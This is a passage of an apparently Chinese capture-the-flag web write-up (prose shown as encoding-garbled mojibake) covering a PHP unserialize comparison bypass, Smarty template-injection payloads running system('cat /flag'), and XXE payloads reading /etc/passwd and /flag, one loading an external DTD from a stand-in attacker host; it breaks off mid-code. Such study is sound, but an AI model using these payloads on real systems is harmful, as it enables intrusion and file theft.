<p>pharä¼ªåè®®åªè®¤pharæ–‡ä»¶ç‰¹å¾ï¼ˆstubç­‰ï¼‰ï¼Œåç¼€æ˜¯ç»™äººçœ‹çš„ï¼Œå› æ­¤å¯ä»¥è§£æzip</p>
<h2 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€ƒå¯Ÿä¸€ä¸ªç‚¹ï¼Œå¸ƒå°”ç±»å‹å’Œénullå€¼æ¯”è¾ƒéƒ½ç­‰äºtrue</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<h2 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12220?time__1311=GqGxRDcGD=G==GN4eeqBKupUKGOA1Na4D">Smartyæ¨¡æ¿æ³¨å…¥&amp;CVE-2017-1000480 - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<blockquote>
<h3 id="æ ‡ç­¾ï¼š"><a href="#æ ‡ç­¾ï¼š" class="headerlink" title="æ ‡ç­¾ï¼š"></a>æ ‡ç­¾ï¼š</h3><h4 id="1-smarty-version"><a href="#1-smarty-version" class="headerlink" title="1. {$smarty.version}"></a>1. <code>&#123;$smarty.version&#125;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #è·å–smartyçš„ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure>

<h4 id="2-php-php"><a href="#2-php-php" class="headerlink" title="2.{php}{/php}"></a>2.<code>&#123;php&#125;&#123;/php&#125;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;  #æ‰§è¡Œç›¸åº”çš„phpä»£ç </span><br></pre></td></tr></table></figure>

<p>Smartyæ”¯æŒä½¿ç”¨ {php}{&#x2F;php} æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚ä½†å› ä¸ºåœ¨Smarty3ç‰ˆæœ¬ä¸­å·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚</p>
<h4 id="3-literal"><a href="#3-literal" class="headerlink" title="3.{literal}"></a>3.<code>&#123;literal&#125;</code></h4><ul>
<li>{literal} å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸º Smarty çš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</li>
<li>åœ¨ PHP5 ç¯å¢ƒä¸‹å­˜åœ¨ä¸€ç§ PHP æ ‡ç­¾ï¼Œ <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;ï¼Œ</code>æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨è¿™ä¸€æ ‡ç­¾è¿›è¡Œä»»æ„çš„ PHP ä»£ç æ‰§è¡Œã€‚</li>
<li>é€šè¿‡ä¸Šè¿°æè¿°ä¹Ÿå¯ä»¥æƒ³åˆ°ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç§æ ‡ç­¾æ¥å®ç° XSS æ”»å‡»ï¼Œè¿™ä¸€ç§æ”»å‡»æ–¹å¼åœ¨ SSTI ä¸­ä¹Ÿæ˜¯å¾ˆå¸¸è§çš„ï¼Œå› ä¸ºåŸºæœ¬ä¸Šæ‰€æœ‰æ¨¡æ¿éƒ½ä¼šå› ä¸ºéœ€è¦æä¾›ç±»ä¼¼çš„åŠŸèƒ½ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;literal&#125;alert(&#x27;xss&#x27;);&#123;/literal&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-if-if"><a href="#4-if-if" class="headerlink" title="4.{if}{/if}"></a>4.<code>&#123;if&#125;&#123;/if&#125;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>Smartyçš„ {if} æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{&#x2F;if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚<code>||</code>ï¼Œ<code>or</code>ï¼Œ<code>&amp;&amp;</code>ï¼Œ<code>and</code>ï¼Œ<code>is_array()</code>ç­‰ç­‰ï¼Œå¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if is_array($array)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜å¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile (&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>æ‰«æå‘ç°composer.jsonï¼Œè®¿é—®å‘ç°æ˜¯smartyæ¨¡æ¿</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240723141451626.png" alt="image-20240723141451626"></p>
<p>å°è¯•è¿›å…¥æ³¨ç‚¹ä¸œè¥¿</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723142227510.png" alt="image-20240723142227510"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723141901771.png" alt="image-20240723141901771"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723142427767.png" alt="image-20240723142427767"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723142444541.png" alt="image-20240723142444541"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723142507129.png" alt="image-20240723142507129"></p>
<h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><p><strong>1.ä»€ä¹ˆæ˜¯xxeï¼Ÿ</strong></p>
<p>XXEæ¼æ´ï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¾“å…¥éªŒè¯ä¸ä¸¥æ ¼çš„ XML è§£æå™¨æ¥æ³¨å…¥æ¶æ„ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ XML <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E6%A1%A3&spm=1001.2101.3001.7020">æ–‡æ¡£</a>å°†å…¶å‘é€åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œåœ¨è§£æè¯¥æ–‡æ¡£æ—¶ï¼ŒXML è§£æå™¨ä¼šåŠ è½½å¤–éƒ¨å®ä½“ï¼ˆå¦‚æ–‡ä»¶ã€URLç­‰ï¼‰ï¼Œä»¥ä¾¿åœ¨æ–‡æ¡£ä¸­å¼•ç”¨å®ƒä»¬ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½æ¥æ‰§è¡Œå„ç§æ”»å‡»ï¼Œä¾‹å¦‚è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€å‘é€å†…éƒ¨ç½‘ç»œè¯·æ±‚ã€ç»•è¿‡èº«ä»½éªŒè¯ç­‰ã€‚</p>
<p>æœ‰ç‚¹åƒSSRF</p>
<p>PHP é»˜è®¤ä½¿ç”¨ libxml æ¥è§£æ XMLï¼Œä½†æ˜¯ä» libxml 2.9.0 å¼€å§‹ï¼Œå®ƒé»˜è®¤ä¸å†è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´ PHP ä¸‹çš„ XXE æ¼æ´å·²ç»é€æ¸æ¶ˆå¤±ï¼Œé™¤éä½ æŒ‡å®š LIBLXML_NOENT å»å¼€å¯å¤–éƒ¨å®ä½“è§£æï¼Œæ‰ä¼šå­˜åœ¨ XXE æ¼æ´ã€‚æ›´å¤šå…¶å®æ˜¯javaæ¼æ´ï¼Œ<strong>å› ä¸º XXE åœ¨åˆ©ç”¨ä¸Šä¸è¯­è¨€æ— å…³ï¼Œæ— è®ºæ˜¯ phpã€java è¿˜æ˜¯ Cã€pythonï¼Œåˆ©ç”¨æŠ€å·§éƒ½æ˜¯ä¸€æ ·çš„ã€‚</strong></p>
<p><strong>2.ä»€ä¹ˆæ˜¯XML</strong></p>
<p>XMLï¼ˆExtensible Markup Languageï¼‰æ„ä¸ºå¯æ‰©å±•æ€§æ ‡è®°è¯­è¨€ï¼ŒXML æ–‡æ¡£ç»“æ„åŒ…æ‹¬ XML å£°æ˜ã€æ–‡æ¡£ç±»å‹å®šä¹‰(DTD)ã€æ–‡æ¡£å…ƒç´ ã€‚</p>
<p>å‚è€ƒä¾‹å­ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XMLå£°æ˜--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">people</span> [  &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ people ç±»å‹çš„æ–‡æ¡£--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">people</span> (<span class="keyword">name</span>,<span class="keyword">age</span>,<span class="keyword">mail</span>)&gt;</span>  &lt;!--å®šä¹‰peopleå…ƒç´ æœ‰3ä¸ªå…ƒç´ --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--å®šä¹‰nameå…ƒç´ ä¸ºâ€œ#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">age</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰ageå…ƒç´ ä¸ºâ€œ#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">mail</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰mailå…ƒç´ ä¸ºâ€œ#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">people</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>john<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mail</span>&gt;</span>john@qq.com<span class="tag">&lt;/<span class="name">mail</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">people</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1.DTD å®ä½“å£°æ˜</strong></p>
<p>DTDï¼ˆDocument Type Definitionï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰ç”¨äºå®šä¹‰ XML æ–‡æ¡£ç»“æ„ï¼ŒåŒ…æ‹¬å…ƒç´ çš„å®šä¹‰è§„åˆ™ã€å…ƒç´ é—´çš„å…³ç³»è§„åˆ™ã€å±æ€§çš„å®šä¹‰è§„åˆ™ï¼Œå…¶å®šä¹‰ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  [å®šä¹‰å†…å®¹]&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2.å†…éƒ¨å®ä½“å£°æ˜</strong></p>
<p>å†…éƒ¨å£°æ˜é‡‡ç”¨å¦‚ä¸‹æ ¼å¼å®šä¹‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“å &quot;å®ä½“å€¼&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>å£°æ˜ä¹‹åå°±å¯ä»¥é€šè¿‡â€œ&amp;å®ä½“å;â€æ¥è·å–ï¼Œç¤ºä¾‹å¦‚ä¸‹</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;john&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">&lt;/root</span><br></pre></td></tr></table></figure>

<p><strong>3.å¤–éƒ¨å®ä½“å¼•ç”¨</strong></p>
<p>XXE çš„äº§ç”Ÿæ­£æ˜¯å¤–éƒ¨å®ä½“å¼•ç”¨çš„ç»“æœï¼Œå¯åˆ†ä¸ºæ™®é€šå®ä½“å’Œå‚æ•°å®ä½“ã€‚</p>
<p>ï¼ˆ1ï¼‰æ™®é€šå®ä½“å£°æ˜æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY å®ä½“å <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="meta">&lt;!ENTITY å®ä½“å <span class="keyword">PUBLIC</span> <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">å£°æ˜å®ä½“ xxeï¼Œç”¨äºè¯»å– /etc/passwd æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ <span class="symbol">&amp;xxe;</span> æ¥å¼•ç”¨æ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure>

<p>ï¼ˆ2ï¼‰å‚æ•°å®ä½“å£°æ˜ä¸»è¦ç”¨äºåç»­ä½¿ç”¨ï¼Œä¸æ™®é€šå®ä½“ä¸åŒçš„æ˜¯ï¼Œå®ƒä¸­é—´æœ‰ç™¾åˆ†å·å­—ç¬¦ï¼ˆ%ï¼‰ï¼Œå…¶å£°æ˜æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % å®ä½“åç§° <span class="string">&quot;å®ä½“çš„å€¼&quot;</span>&gt;</span></span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="meta">&lt;!ENTITY % å®ä½“åç§° <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„</strong>ï¼š</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://hacker.com/evil.dtd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">    %xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>xxe.dtd å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">evil</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢å…ˆå£°æ˜ xxe å‚æ•°å®ä½“ï¼Œå¼•å…¥å¤–éƒ¨å®ä½“ â€œ<a target="_blank" rel="noopener" href="http://hacker.com/evil.dtd%22%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%A3%B0%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%AB">http://hacker.com/evil.dtd&quot;ï¼Œé‡Œé¢å£°æ˜äº†ä¸€ä¸ªå«</a> evil çš„å®ä½“ï¼Œç”¨äºè¯»å– &#x2F;etc&#x2F;passwd æ–‡ä»¶ï¼Œæœ€ååœ¨é€šè¿‡ &evil; æ¥å¼•ç”¨æ‰§è¡Œã€‚ åœ¨ä¸åŒçš„è¯­è¨€ä¸­å…¶æ”¯æŒåè®®è¿˜ä¸ä¸€æ ·ï¼Œéœ€è¦æ ¹æ®ä¸šåŠ¡åœºæ™¯æ¥å®æµ‹ï¼Œå¸¸è§çš„åè®®æœ‰ fileã€httpã€ftpã€httpsã€except ç­‰ç­‰ã€‚</p>
<p><strong>æ™®é€šå®ä½“å’Œå¤–éƒ¨å®ä½“çš„å·®åˆ«ï¼š</strong></p>
<p>ä½œç”¨èŒƒå›´ï¼šæ™®é€šå®ä½“çš„ä½œç”¨èŒƒå›´æ˜¯æ•´ä¸ª XML æ–‡æ¡£ã€‚å½“ XML è§£æå™¨é‡åˆ°æŸä¸ªå®ä½“æ—¶ï¼Œä¼šå°†å…¶æ›¿æ¢ä¸ºå®ä½“çš„å®šä¹‰å†…å®¹ã€‚è€Œå‚æ•°å®ä½“åªåœ¨å£°æ˜å®ƒä»¬çš„ DTD å†…æœ‰æ•ˆã€‚DTD æ˜¯ä¸€ç§æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œå®ƒè§„å®šäº† XML æ–‡æ¡£çš„ç»“æ„ã€æ ‡ç­¾ç­‰æ–¹é¢çš„è§„èŒƒã€‚</p>
<p>å›åˆ°é¢˜ç›®ï¼ŒæŠ“åŒ…å‘ç°å¯èƒ½å­˜åœ¨xxe</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240724153830857.png" alt="image-20240724153830857"></p>
<p>exp</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="HNCTF-2022-WEEK2-easy-unser"><a href="#HNCTF-2022-WEEK2-easy-unser" class="headerlink" title="[HNCTF 2022 WEEK2]easy_unser"></a>[HNCTF 2022 WEEK2]easy_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;f14g.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can 